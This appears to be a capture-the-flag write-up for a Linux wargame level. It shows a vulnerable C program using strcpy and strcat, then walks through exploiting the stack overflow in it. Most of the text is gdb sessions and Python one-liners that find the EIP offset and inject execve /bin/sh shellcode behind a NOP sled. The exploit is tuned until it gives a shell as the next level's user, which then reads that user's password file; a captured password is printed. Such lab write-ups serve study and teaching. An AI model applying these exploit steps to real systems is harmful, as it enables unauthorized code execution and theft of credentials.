@@ -1,0 +1,174 @@
+Pwnage Linux level 2/15 Writeup
+
+Welcome to another episode of Linux Pwnage, tonight we're going to deal with
+a little weirder overflow and we'll discover some new tricks.
+
+Let's start, even this time, from the source:
+
+"
+// Created by Hidden (hidden@undernet.org)
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+char* concat(char *buf, char *s1, char *s2)
+{
+	// Copy s1 to buf
+	strcpy(buf, s1);
+	// Append s2 to s1 into buf
+	strcat(buf, s2);
+	return buf;
+}
+
+
+int main(int argc, char **argv)
+{
+	char buf[256];
+	char buf1[128];
+	char buf2[128];
+
+	if (argc != 3)
+		return 0;
+
+	// Copy argv[1] to buf1 and argv[2] to buf2
+	strncpy(buf1, argv[1], sizeof(buf1));
+	strncpy(buf2, argv[2], sizeof(buf2));
+
+	concat(buf, buf2, buf1);
+	printf("String result: %s\n", buf);
+	return 0;
+}
+"
+
+this time, we got 3 buffers (128, 128 and 256 bytes), two of them user supplied
+via command line arguments, those two will then be concatenated into the third,
+the 256 bytes one, by the custom concat function.
+
+The use of strcat in the concatenation utility and the location of the biggest buffer
+on the stack suggest we probably could overflow it over saved EIP, so let's try.
+
+Not being myself such a good auditor, I decided to get immediately my hands dirty
+and try some input; after some fiddling, it comes out we get to overflow
+the return address with 125 and 128 characters in our controlled buffers, respectively;
+the return address will be overwritten by the first buffer.
+
+"
+gdb) r $(python -c "print 'A'*125") $(python -c "print 'B'*128") 
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /levels/level3 $(python -c "print 'A'*125") $(python -c "print 'B'*128")
+String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+"
+
+The next step will be finding the offset in our buffer at which the overflow will happen;
+this time too, although it could probably be desumed by a good analisys of the concatenation
+process, we'll use a simpler trick: enter the non-repeating pattern (hints: msf pattern_create,
+https://www.phillips321.co.uk/2013/04/02/recreating-pattern_create-rb-in-python/,
+https://github.com/longld/peda).
+
+So, running our binary in gdb, with a 125 non-repeating pattern as our first buffer (and
+leaving the second one unchanged), we could then search for the resulting EIP (at crash time)
+in the pattern and get our offset (spoiler alert: it's 15).
+
+"
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6
+Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae $(python -c "print 'B'*128") 
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /levels/level3 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab
+8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae $(python -c "print 'B'*128")
+String result: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9A
+c0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0AeAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab
+2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41356141 in ?? ()
+
+"
+
+"
+Python 2.7.10 (default, Jun  1 2015, 16:21:46) 
+[GCC 4.9.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> a = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae'
+>>> a.find('\x41\x61\x35\x41')
+15
+"
+
+Now that we reliably control EIP, the following steps are chosing a payload and shipping it.
+Considering that the second buffer gives us a fair amount of space, it will be the most
+obvious candidate to deliver our shellcode.
+
+Reusing the short execve /bin/sh shellcode from level1 (http://shell-storm.org/shellcode/files/shellcode-841.php),
+our layout would be very similar too:
+
+Buffer1 {[junk][return_address]} Buffer2 {[nop_sled][shellcode][junk]}
+
+After getting buf2 memory address with gdb (p &buf2 ; it should be 0xbffff490), we can start assembling our exploit:
+
+"
+(gdb) r $(python -c "print 'A'*15 + '\x90\xf4\xff\xbf' + 'A'*(125-19)") 
+$(python -c "print '\x90'*50 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'B'*(128-71)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /levels/level3 $(python -c "print 'A'*15 + '\x90\xf4\xff\xbf' + 'A'*(125-19)") 
+$(python -c "print '\x90'*50 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'B'*(128-71)")
+String result: ��������������������������������������������������1����
+
+                                                                      
+Qh//shh/bin��̀BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+process 29666 is executing new program: /bin/dash
+$ 
+"
+
+We popped a shell.
+
+Let's try it outside of the debugger:
+
+"
+level3@rzt-bin01:/levels$ ./level3 $(python -c "print 'A'*15 + '\x90\xf4\xff\xbf' + 'A'*(125-19)") 
+$(python -c "print '\x90'*50 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'B'*(128-71)")
+String result: ��������������������������������������������������1����
+
+                                                                      
+Qh//shh/bin��̀BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+"
+
+Even this time, the ret address and nop_sled seem to need a little tweaking to work in real word,
+that's probably gdb introducing some difference in the memory pattern and offsets.
+However, let's extend the sled, move the return address a litte forward and hope for a soft landing.
+(**Hint: sometimes the memory layout between in-gdb and out-of-gdb gets out of phase, very often
+shifting your return address forward or backward of around 0x60 (96) bytes solves the issue**)
+
+"
+level3@rzt-bin01:/levels$ ./level3 $(python -c "print 'A'*15 + '\xd0\xf4\xff\xbf' + 'A'*(125-19)") 
+$(python -c "print '\x90'*100 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'B'*(128-121)")
+String result: ����������������������������������������������������������������������������������������������������1����
+
+                                        
+Qh//shh/bin��̀BBBBBBBAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+$ whoami
+level4
+$ cat /home/level4/.pass
+VHDY2pdYVyXi08kupbos
+"
+
+Aaaand it's done.
